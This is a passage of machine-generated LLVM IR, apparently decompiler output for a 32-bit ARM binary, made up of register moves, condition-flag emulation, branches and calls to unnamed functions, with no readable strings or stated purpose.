  %v1_94c8 = add i32 %v0_94c8, 656
  %v2_94c8 = inttoptr i32 %v1_94c8 to i32*
  %v3_94c8 = load i32, i32* %v2_94c8, align 4
  store i32 %v3_94c8, i32* %r3.global-to-local, align 4
  %v2_94cc = sub i32 %v3_94c8, %v0_94c0
  store i32 %v2_94cc, i32* @r4, align 4
  store i32 %v2_94cc, i32* @r2, align 4
  store i32 %v2_94cc, i32* %v2_94c8, align 4
  %v0_94d8 = load i32, i32* @r7, align 4
  %v1_94d8 = load i32, i32* @r5, align 4
  %v2_94d8 = add i32 %v1_94d8, %v0_94d8
  store i32 %v2_94d8, i32* @r1, align 4
  store i32 %v0_94d8, i32* @r0, align 4
  %v3_94e0 = call i32 @function_13c80(i32 %v0_94d8, i32 %v2_94d8, i32 %v2_94cc)
  store i32 %v3_94e0, i32* %r0.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r8, align 4
  %v1_94e4 = add i32 %v0_94e4, 656
  %v2_94e4 = inttoptr i32 %v1_94e4 to i32*
  %v3_94e4 = load i32, i32* %v2_94e4, align 4
  store i32 %v3_94e4, i32* @r4, align 4
  store i32 0, i32* @lr, align 4
  %v1_94ec = load i32, i32* %sb.global-to-local, align 4
  %v2_94ec = add i32 %v1_94ec, %v3_94e4
  store i32 %v2_94ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94f0 = icmp slt i32 %v3_94e4, 0
  store i1 %v1_94f0, i1* %cpsr_n.global-to-local, align 1
  %v2_94f0 = icmp eq i32 %v3_94e4, 0
  store i1 %v2_94f0, i1* %cpsr_z.global-to-local, align 1
  %v3_94f4 = add i32 %v2_94ec, 2116
  %v4_94f4 = inttoptr i32 %v3_94f4 to i8*
  store i8 0, i8* %v4_94f4, align 1
  %v0_94f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_94f8, label %dec_label_pc_9510, label %dec_label_pc_94fc

dec_label_pc_94fc:                                ; preds = %dec_label_pc_94c8, %dec_label_pc_9460
  %v0_94fc = load i32, i32* @r8, align 4
  %v1_94fc = add i32 %v0_94fc, 8
  %v2_94fc = inttoptr i32 %v1_94fc to i32*
  %v3_94fc = load i32, i32* %v2_94fc, align 4
  store i32 %v3_94fc, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9500 = icmp slt i32 %v3_94fc, 0
  store i1 %v1_9500, i1* %cpsr_n.global-to-local, align 1
  %v2_9500 = icmp eq i32 %v3_94fc, 0
  store i1 %v2_9500, i1* %cpsr_z.global-to-local, align 1
  %v5_9504 = icmp sgt i32 %v3_94fc, 0
  br i1 %v5_9504, label %dec_label_pc_9478, label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94fc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9498

dec_label_pc_9510:                                ; preds = %dec_label_pc_94c8, %dec_label_pc_94c0
  %v0_9510 = load i32, i32* @r8, align 4
  %v1_9510 = add i32 %v0_9510, -1452
  %v2_9510 = inttoptr i32 %v1_9510 to i8*
  %v3_9510 = load i8, i8* %v2_9510, align 1
  %v4_9510 = zext i8 %v3_9510 to i32
  store i32 %v4_9510, i32* %r3.global-to-local, align 4
  %v2_9514 = icmp ugt i8 %v3_9510, 6
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9514 = icmp ult i8 %v3_9510, 7
  store i1 %v6_9514, i1* %cpsr_n.global-to-local, align 1
  %v7_9514 = icmp eq i8 %v3_9510, 7
  store i1 %v7_9514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9514, label %dec_label_pc_951c, label %dec_label_pc_8838

dec_label_pc_951c:                                ; preds = %dec_label_pc_9510
  %v1_951c = add i32 %v0_9510, 656
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  store i32 %v3_951c, i32* %r3.global-to-local, align 4
  %v1_9520 = add i32 %v3_951c, -1024
  %v2_9520 = icmp ugt i32 %v3_951c, 1023
  store i1 %v2_9520, i1* %cpsr_c.global-to-local, align 1
  %v3_9520 = sub i32 1023, %v3_951c
  %v4_9520 = and i32 %v3_9520, %v3_951c
  %v5_9520 = icmp slt i32 %v4_9520, 0
  store i1 %v5_9520, i1* %cpsr_v.global-to-local, align 1
  %v6_9520 = icmp slt i32 %v1_9520, 0
  store i1 %v6_9520, i1* %cpsr_n.global-to-local, align 1
  %v7_9520 = icmp eq i32 %v3_951c, 1024
  store i1 %v7_9520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9520, label %dec_label_pc_9528.loopexit, label %dec_label_pc_9430

dec_label_pc_9528.loopexit:                       ; preds = %dec_label_pc_951c
  %v0_9528.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_9528

dec_label_pc_9528:                                ; preds = %dec_label_pc_9528.loopexit, %dec_label_pc_940c
  %v0_9528 = phi i32 [ %v0_9528.pre, %dec_label_pc_9528.loopexit ], [ %v1_9428, %dec_label_pc_940c ]
  store i32 %v0_9528, i32* @r0, align 4
  %v1_952c = add i32 %v0_9528, 64
  store i32 %v1_952c, i32* @r1, align 4
  store i32 960, i32* @r2, align 4
  %v3_9534 = call i32 @function_13c80(i32 %v0_9528, i32 %v1_952c, i32 960)
  store i32 %v3_9534, i32* %r0.global-to-local, align 4
  %v0_9538 = load i32, i32* @r8, align 4
  %v1_9538 = add i32 %v0_9538, 656
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  %v1_953c = add i32 %v3_9538, -64
  store i32 %v1_953c, i32* @r4, align 4
  store i32 %v1_953c, i32* %v2_9538, align 4
  br label %dec_label_pc_9430

dec_label_pc_9548:                                ; preds = %dec_label_pc_9478
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_9550 = call i32 @function_12288(i32 36, i32* null)
  %v0_9554 = load i32, i32* @r4, align 4
  store i32 %v0_9554, i32* %r1.global-to-local, align 4
  store i32 %v3_9550, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9560 = load i32, i32* @r7, align 4
  store i32 %v0_9560, i32* %r0.global-to-local, align 4
  %v4_9564 = call i32 @function_12d58(i32 %v0_9560, i32 %v0_9554, i32 %v3_9550, i32 11)
  store i32 %v4_9564, i32* %r0.global-to-local, align 4
  %v2_9568 = add i32 %v4_9564, 1
  %v3_9568 = icmp eq i32 %v4_9564, -1
  store i1 %v3_9568, i1* %cpsr_c.global-to-local, align 1
  %v4_9568 = sub i32 0, %v4_9564
  %v5_9568 = and i32 %v2_9568, %v4_9568
  %v6_9568 = icmp slt i32 %v5_9568, 0
  store i1 %v6_9568, i1* %cpsr_v.global-to-local, align 1
  %v7_9568 = icmp slt i32 %v2_9568, 0
  store i1 %v7_9568, i1* %cpsr_n.global-to-local, align 1
  %v8_9568 = icmp eq i32 %v2_9568, 0
  store i1 %v8_9568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9568, label %dec_label_pc_9570, label %dec_label_pc_9ad4

dec_label_pc_9570:                                ; preds = %dec_label_pc_9548
  %v0_9570 = load i32, i32* @r8, align 4
  %v1_9570 = add i32 %v0_9570, 8
  %v2_9570 = inttoptr i32 %v1_9570 to i32*
  %v3_9570 = load i32, i32* %v2_9570, align 4
  store i32 %v3_9570, i32* @r6, align 4
  br label %dec_label_pc_9498

dec_label_pc_9578:                                ; preds = %dec_label_pc_94a0
  %v0_9578 = load i32, i32* @r7, align 4
  store i32 %v0_9578, i32* %r0.global-to-local, align 4
  %v1_957c = add i32 %v0_94a0, 656
  %v2_957c = inttoptr i32 %v1_957c to i32*
  %v3_957c = load i32, i32* %v2_957c, align 4
  store i32 %v3_957c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9588 = call i32 @function_12d58(i32 %v0_9578, i32 %v3_957c, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  store i32 %v5_9588, i32* %r0.global-to-local, align 4
  %v1_958c = add i32 %v5_9588, 1
  %v2_958c = icmp eq i32 %v5_9588, -1
  store i1 %v2_958c, i1* %cpsr_c.global-to-local, align 1
  %v3_958c = sub i32 0, %v5_9588
  %v4_958c = and i32 %v1_958c, %v3_958c
  %v5_958c = icmp slt i32 %v4_958c, 0
  store i1 %v5_958c, i1* %cpsr_v.global-to-local, align 1
  %v6_958c = icmp slt i32 %v1_958c, 0
  store i1 %v6_958c, i1* %cpsr_n.global-to-local, align 1
  %v7_958c = icmp eq i32 %v1_958c, 0
  store i1 %v7_958c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_958c, label %dec_label_pc_94c0, label %dec_label_pc_9594

dec_label_pc_9594:                                ; preds = %dec_label_pc_9578
  %v0_9594 = load i32, i32* @r8, align 4
  %v1_9594 = add i32 %v0_9594, 656
  %v2_9594 = inttoptr i32 %v1_9594 to i32*
  %v3_9594 = load i32, i32* %v2_9594, align 4
  store i32 %v3_9594, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_95a0 = load i32, i32* @r7, align 4
  store i32 %v0_95a0, i32* %r0.global-to-local, align 4
  %v5_95a4 = call i32 @function_12d58(i32 %v0_95a0, i32 %v3_9594, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  %v1_95a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_95a8 = add i32 %v1_95a8, %v5_95a4
  store i32 %v2_95a8, i32* %ip.global-to-local, align 4
  store i32 %v5_95a4, i32* @r5, align 4
  store i32 %v5_95a4, i32* %r1.global-to-local, align 4
  %v0_95b4 = load i32, i32* @r7, align 4
  store i32 %v0_95b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32* %r2.global-to-local, align 4
  %v0_95bc = load i32, i32* @r4, align 4
  store i32 %v0_95bc, i32* %r3.global-to-local, align 4
  %v0_95c0 = load i32, i32* @r6, align 4
  %v1_95c0 = trunc i32 %v0_95c0 to i8
  %v3_95c0 = add i32 %v2_95a8, 2114
  %v4_95c0 = inttoptr i32 %v3_95c0 to i8*
  store i8 %v1_95c0, i8* %v4_95c0, align 1
  %v4_95c4 = call i32 @function_12d58(i32 %v0_95b4, i32 %v5_95a4, i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32 %v0_95bc)
  store i32 %v4_95c4, i32* %r0.global-to-local, align 4
  %v1_95c8 = add i32 %v4_95c4, 1
  %v2_95c8 = icmp eq i32 %v4_95c4, -1
  store i1 %v2_95c8, i1* %cpsr_c.global-to-local, align 1
  %v3_95c8 = sub i32 0, %v4_95c4
  %v4_95c8 = and i32 %v1_95c8, %v3_95c8
  %v5_95c8 = icmp slt i32 %v4_95c8, 0
  store i1 %v5_95c8, i1* %cpsr_v.global-to-local, align 1
  %v6_95c8 = icmp slt i32 %v1_95c8, 0
  store i1 %v6_95c8, i1* %cpsr_n.global-to-local, align 1
  %v7_95c8 = icmp eq i32 %v1_95c8, 0
  store i1 %v7_95c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95c8, label %dec_label_pc_95ec, label %dec_label_pc_95d0

dec_label_pc_95d0:                                ; preds = %dec_label_pc_9594
  %v0_95d0 = load i32, i32* @r7, align 4
  store i32 %v0_95d0, i32* %r0.global-to-local, align 4
  %v0_95d4 = load i32, i32* @r5, align 4
  store i32 %v0_95d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32* %r2.global-to-local, align 4
  %v0_95dc = load i32, i32* @r4, align 4
  store i32 %v0_95dc, i32* %r3.global-to-local, align 4
  %v4_95e0 = call i32 @function_12d58(i32 %v0_95d0, i32 %v0_95d4, i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32 %v0_95dc)
  %v1_95e4 = load i32, i32* %sb.global-to-local, align 4
  %v2_95e4 = add i32 %v1_95e4, %v4_95e0
  store i32 %v2_95e4, i32* %r0.global-to-local, align 4
  %v0_95e8 = load i32, i32* @r6, align 4
  %v1_95e8 = trunc i32 %v0_95e8 to i8
  %v3_95e8 = add i32 %v2_95e4, 2116
  %v4_95e8 = inttoptr i32 %v3_95e8 to i8*
  store i8 %v1_95e8, i8* %v4_95e8, align 1
  br label %dec_label_pc_95ec

dec_label_pc_95ec:                                ; preds = %dec_label_pc_9594, %dec_label_pc_95d0
  %v0_95ec = load i32, i32* @r7, align 4
  store i32 %v0_95ec, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_95f4 = inttoptr i32 %v0_95ec to i8*
  %v3_95f4 = call i32 @function_12dc0(i8* %v2_95f4, i32 16)
  store i32 %v3_95f4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_95f8 = icmp slt i32 %v3_95f4, 0
  store i1 %v1_95f8, i1* %cpsr_n.global-to-local, align 1
  %v2_95f8 = icmp eq i32 %v3_95f4, 0
  store i1 %v2_95f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f8, label %dec_label_pc_9d84, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %dec_label_pc_95ec
  %v1_9600 = add i32 %v3_95f4, 2
  store i32 %v1_9600, i32* %r6.global-to-local, align 4
  %v1_9604 = load i32, i32* @r8, align 4
  %v2_9604 = add i32 %v1_9604, 8
  %v3_9604 = inttoptr i32 %v2_9604 to i32*
  store i32 %v1_9600, i32* %v3_9604, align 4
  br label %dec_label_pc_94c0

dec_label_pc_960c:                                ; preds = %dec_label_pc_8cb4
  %v0_960c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_960c, i32* %r1.global-to-local, align 4
  %v0_9610 = load i32, i32* @r6, align 4
  store i32 %v0_9610, i32* @r0, align 4
  %v2_9614 = inttoptr i32 %v0_9610 to i8*
  %v3_9614 = call i32 @function_12cbc(i8* %v2_9614, i32 %v0_960c)
  store i32 %v3_9614, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8ccc

dec_label_pc_961c:                                ; preds = %dec_label_pc_8830
  %v0_961c = call i32 @function_13c28()
  store i32 %v0_961c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v0_961c, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9628:                                ; preds = %dec_label_pc_9648.dec_label_pc_9628_crit_edge, %dec_label_pc_961c
  %v1_9628 = phi i32 [ %v1_9628.pre, %dec_label_pc_9648.dec_label_pc_9628_crit_edge ], [ %v0_961c, %dec_label_pc_961c ]
  %v0_9628 = phi i32 [ %v0_9628.pre, %dec_label_pc_9648.dec_label_pc_9628_crit_edge ], [ 0, %dec_label_pc_961c ]
  %v2_9628 = inttoptr i32 %v1_9628 to i32*
  store i32 %v0_9628, i32* %v2_9628, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  %v0_9630 = load i32, i32* @r8, align 4
  %v1_9630 = add i32 %v0_9630, -1456
  %v2_9630 = inttoptr i32 %v1_9630 to i32*
  %v3_9630 = load i32, i32* %v2_9630, align 4
  store i32 %v3_9630, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_963c = call i32 @function_13e60(i32 %v3_9630, i32* nonnull %stack_var_-20809, i32 10240, i32 16384)
  store i32 %v5_963c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9640 = icmp slt i32 %v5_963c, 0
  store i1 %v1_9640, i1* %cpsr_n.global-to-local, align 1
  %v2_9640 = icmp eq i32 %v5_963c, 0
  store i1 %v2_9640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9640, label %dec_label_pc_9920, label %dec_label_pc_9648

dec_label_pc_9648:                                ; preds = %dec_label_pc_9628
  %v2_9648 = add i32 %v5_963c, 1
  %v3_9648 = icmp eq i32 %v5_963c, -1
  store i1 %v3_9648, i1* %cpsr_c.global-to-local, align 1
  %v4_9648 = sub i32 0, %v5_963c
  %v5_9648 = and i32 %v2_9648, %v4_9648
  %v6_9648 = icmp slt i32 %v5_9648, 0
  store i1 %v6_9648, i1* %cpsr_v.global-to-local, align 1
  %v7_9648 = icmp slt i32 %v2_9648, 0
  store i1 %v7_9648, i1* %cpsr_n.global-to-local, align 1
  %v8_9648 = icmp eq i32 %v2_9648, 0
  store i1 %v8_9648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9648, label %dec_label_pc_9650, label %dec_label_pc_9648.dec_label_pc_9628_crit_edge

dec_label_pc_9648.dec_label_pc_9628_crit_edge:    ; preds = %dec_label_pc_9648
  %v0_9628.pre = load i32, i32* @r5, align 4
  %v1_9628.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9650:                                ; preds = %dec_label_pc_9648
  %v0_9650 = load i32, i32* @r4, align 4
  %v1_9650 = inttoptr i32 %v0_9650 to i32*
  %v2_9650 = load i32, i32* %v1_9650, align 4
  store i32 %v2_9650, i32* %r3.global-to-local, align 4
  %v1_9654 = add i32 %v2_9650, -11
  %v2_9654 = icmp ugt i32 %v2_9650, 10
  store i1 %v2_9654, i1* %cpsr_c.global-to-local, align 1
  %v3_9654 = sub i32 10, %v2_9650
  %v4_9654 = and i32 %v3_9654, %v2_9650
  %v5_9654 = icmp slt i32 %v4_9654, 0
  store i1 %v5_9654, i1* %cpsr_v.global-to-local, align 1
  %v6_9654 = icmp slt i32 %v1_9654, 0
  store i1 %v6_9654, i1* %cpsr_n.global-to-local, align 1
  %v7_9654 = icmp eq i32 %v2_9650, 11
  store i1 %v7_9654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9654, label %dec_label_pc_9a98, label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_9650, %dec_label_pc_9920
  %v0_965c = load i32, i32* @r8, align 4
  %v1_965c = add i32 %v0_965c, -1456
  %v2_965c = inttoptr i32 %v1_965c to i32*
  %v3_965c = load i32, i32* %v2_965c, align 4
  store i32 %v3_965c, i32* %r0.global-to-local, align 4
  %v1_9660 = call i32 @function_13654(i32 %v3_965c)
  store i32 %v1_9660, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_966c = load i32, i32* @r8, align 4
  %v2_966c = add i32 %v1_966c, -1456
  %v3_966c = inttoptr i32 %v2_966c to i32*
  store i32 -1, i32* %v3_966c, align 4
  %v0_9670 = load i32, i32* %r1.global-to-local, align 4
  %v1_9670 = trunc i32 %v0_9670 to i8
  %v2_9670 = load i32, i32* @r8, align 4
  %v3_9670 = add i32 %v2_9670, -1452
  %v4_9670 = inttoptr i32 %v3_9670 to i8*
  store i8 %v1_9670, i8* %v4_9670, align 1
  br label %dec_label_pc_8838

dec_label_pc_9678:                                ; preds = %dec_label_pc_934c, %dec_label_pc_9328
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9680 = call i32 @function_12288(i32 37, i32* null)
  %v0_9684 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9684, i32* @r1, align 4
  store i32 %v3_9680, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9690 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_9684, i32 %v3_9680)
  store i32 %v4_9690, i32* %r0.global-to-local, align 4
  %v1_9698 = add i32 %v4_9690, 1
  %v2_9698 = icmp eq i32 %v4_9690, -1
  store i1 %v2_9698, i1* %cpsr_c.global-to-local, align 1
  %v3_9698 = sub i32 0, %v4_9690
  %v4_9698 = and i32 %v1_9698, %v3_9698
  %v5_9698 = icmp slt i32 %v4_9698, 0
  store i1 %v5_9698, i1* %cpsr_v.global-to-local, align 1
  %v6_9698 = icmp slt i32 %v1_9698, 0
  store i1 %v6_9698, i1* %cpsr_n.global-to-local, align 1
  %v7_9698 = icmp eq i32 %v1_9698, 0
  store i1 %v7_9698, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9698, label %dec_label_pc_98c0, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9678
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_96ac = call i32 @function_12288(i32 37, i32* null)
  %v0_96b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96b0, i32* @r1, align 4
  store i32 %v3_96ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_96bc = call i32 @function_12fe8(i8* %tmp199, i32 %v0_96b0, i32 %v3_96ac)
  store i32 %v4_96bc, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_96c8 = add i32 %v4_96bc, %v2_8748
  store i32 %v2_96c8, i32* %r3.global-to-local, align 4
  %v1_96cc = load i32, i32* @r5, align 4
  %v2_96cc = add i32 %v1_96cc, %v2_96c8
  %v3_96cc = inttoptr i32 %v2_96cc to i8*
  %v4_96cc = load i8, i8* %v3_96cc, align 1
  store i32 %v2_8280, i32* %lr.global-to-local, align 4
  %v2_96d4 = icmp ugt i8 %v4_96cc, 31
  store i1 %v2_96d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_96d4 = icmp ult i8 %v4_96cc, 32
  store i1 %v6_96d4, i1* %cpsr_n.global-to-local, align 1
  %v7_96d4 = icmp eq i8 %v4_96cc, 32
  store i1 %v7_96d4, i1* %cpsr_z.global-to-local, align 1
  %v2_96dc = zext i1 %v7_96d4 to i32
  %v2_96dc.v4_96bc = add i32 %v2_96dc, %v4_96bc
  store i32 %v2_96dc.v4_96bc, i32* @r4, align 4
  %v2_96e0 = add i32 %v2_96dc.v4_96bc, %v2_8280
  store i32 %v2_96e0, i32* @r6, align 4
  store i32 %v2_96e0, i32* %r0.global-to-local, align 4
  %v1_96e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_96e8 = sub i32 %v1_96e8, %v2_96dc.v4_96bc
  store i32 %v2_96e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_96f4 = call i32 @function_12d58(i32 %v2_96e0, i32 %v2_96e8, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  store i32 %v5_96f4, i32* %r0.global-to-local, align 4
  %v1_96f8 = add i32 %v5_96f4, 1
  %v2_96f8 = icmp eq i32 %v5_96f4, -1
  store i1 %v2_96f8, i1* %cpsr_c.global-to-local, align 1
  %v3_96f8 = sub i32 0, %v5_96f4
  %v4_96f8 = and i32 %v1_96f8, %v3_96f8
  %v5_96f8 = icmp slt i32 %v4_96f8, 0
  store i1 %v5_96f8, i1* %cpsr_v.global-to-local, align 1
  %v6_96f8 = icmp slt i32 %v1_96f8, 0
  store i1 %v6_96f8, i1* %cpsr_n.global-to-local, align 1
  %v7_96f8 = icmp eq i32 %v1_96f8, 0
  store i1 %v7_96f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_96f4, i32* @r7, align 4
  br i1 %v7_96f8, label %dec_label_pc_98c0, label %dec_label_pc_9704

dec_label_pc_9704:                                ; preds = %dec_label_pc_96a4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v1_970c = load i32, i32* @r4, align 4
  %v2_970c = add i32 %v1_970c, %v2_8748
  %v1_9710 = add i32 %v5_96f4, -1
  %v2_9710 = icmp ne i32 %v5_96f4, 0
  store i1 %v2_9710, i1* %cpsr_c.global-to-local, align 1
  %v3_9710 = sub i32 0, %v5_96f4
  %v4_9710 = and i32 %v5_96f4, %v3_9710
  %v5_9710 = icmp slt i32 %v4_9710, 0
  store i1 %v5_9710, i1* %cpsr_v.global-to-local, align 1
  %v6_9710 = icmp slt i32 %v1_9710, 0
  store i1 %v6_9710, i1* %cpsr_n.global-to-local, align 1
  %v7_9710 = icmp eq i32 %v5_96f4, 1
  store i1 %v7_9710, i1* %cpsr_z.global-to-local, align 1
  %v1_9714 = add i32 %v2_970c, -20736
  store i32 %v1_9714, i32* %r3.global-to-local, align 4
  %v7_9718 = icmp sgt i32 %v5_96f4, 1
  br i1 %v7_9718, label %bb231, label %bb232

bb231:                                            ; preds = %dec_label_pc_9704
  %v9_9718 = add i32 %v5_96f4, -2
  store i32 %v9_9718, i32* @r7, align 4
  br label %bb232

bb232:                                            ; preds = %dec_label_pc_9704, %bb231
  %v3_9724 = phi i32 [ %v5_96f4, %dec_label_pc_9704 ], [ %v9_9718, %bb231 ]
  %v1_971c = add i32 %v2_970c, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_9724 = add i32 %v1_971c, %v3_9724
  %v5_9724 = inttoptr i32 %v4_9724 to i8*
  store i8 0, i8* %v5_9724, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v2_8280, i32* @lr, align 4
  %v1_9738 = load i32, i32* @r4, align 4
  %v2_9738 = add i32 %v1_9738, %v2_8280
  %v3_9738 = inttoptr i32 %v2_9738 to i8*
  %v4_9738 = load i8, i8* %v3_9738, align 1
  %v6_9738 = zext i8 %v4_9738 to i32
  store i32 %v6_9738, i32* %r0.global-to-local, align 4
  %v1_973c = add nsw i32 %v6_9738, -48
  store i32 %v1_973c, i32* %r3.global-to-local, align 4
  %v2_9740 = icmp ugt i32 %v1_973c, 8
  store i1 %v2_9740, i1* %cpsr_c.global-to-local, align 1
  %v3_9740 = sub nsw i32 56, %v6_9738
  %v4_9740 = and i32 %v3_9740, %v1_973c
  %v5_9740 = icmp slt i32 %v4_9740, 0
  store i1 %v5_9740, i1* %cpsr_v.global-to-local, align 1
  %v6_9740 = icmp ult i8 %v4_9738, 57
  store i1 %v6_9740, i1* %cpsr_n.global-to-local, align 1
  %v7_9740 = icmp eq i32 %v1_973c, 9
  store i1 %v7_9740, i1* %cpsr_z.global-to-local, align 1
  %v2_9744 = xor i1 %v7_9740, true
  %v3_9744 = and i1 %v2_9740, %v2_9744
  br i1 %v3_9744, label %.thread142, label %dec_label_pc_974c

.thread142:                                       ; preds = %bb232
  %v4_9744 = load i32, i32* @r6, align 4
  br label %dec_label_pc_9774

dec_label_pc_974c:                                ; preds = %bb232
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_975c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9750, %dec_label_pc_974c
  %v0_9750 = phi i32 [ %v1_9750, %dec_label_pc_9750 ], [ 0, %dec_label_pc_974c ]
  %v1_9750 = add i32 %v0_9750, 1
  store i32 %v1_9750, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 %v1_9750, i32* %stack_var_-40, align 4
  %v2_975c = add i32 %v1_9750, %v1_975c.pre
  %v3_975c = inttoptr i32 %v2_975c to i8*
  %v4_975c = load i8, i8* %v3_975c, align 1
  %v6_975c = zext i8 %v4_975c to i32
  store i32 %v6_975c, i32* %r0.global-to-local, align 4
  %v1_9760 = add nsw i32 %v6_975c, -48
  %v2_9764 = icmp ugt i32 %v1_9760, 8
  store i1 %v2_9764, i1* %cpsr_c.global-to-local, align 1
  %v3_9764 = sub nsw i32 56, %v6_975c
  %v4_9764 = and i32 %v3_9764, %v1_9760
  %v5_9764 = icmp slt i32 %v4_9764, 0
  store i1 %v5_9764, i1* %cpsr_v.global-to-local, align 1
  %v6_9764 = icmp ult i8 %v4_975c, 57
  store i1 %v6_9764, i1* %cpsr_n.global-to-local, align 1
  %v7_9764 = icmp eq i32 %v1_9760, 9
  store i1 %v7_9764, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9750, i32* %r3.global-to-local, align 4
  %v2_976c = xor i1 %v2_9764, true
  %v3_976c = or i1 %v7_9764, %v2_976c
  br i1 %v3_976c, label %dec_label_pc_9750, label %dec_label_pc_9774

dec_label_pc_9774:                                ; preds = %dec_label_pc_9750, %.thread142
  %v2_9780 = phi i32 [ %v4_9744, %.thread142 ], [ %v2_975c, %dec_label_pc_9750 ]
  %v0_9774 = phi i32 [ %v6_9738, %.thread142 ], [ %v6_975c, %dec_label_pc_9750 ]
  store i32 %v2_9780, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9774 = icmp eq i32 %v0_9774, 0
  store i1 %v2_9774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9774, label %dec_label_pc_98c0, label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_9774
  store i32 0, i32* @r5, align 4
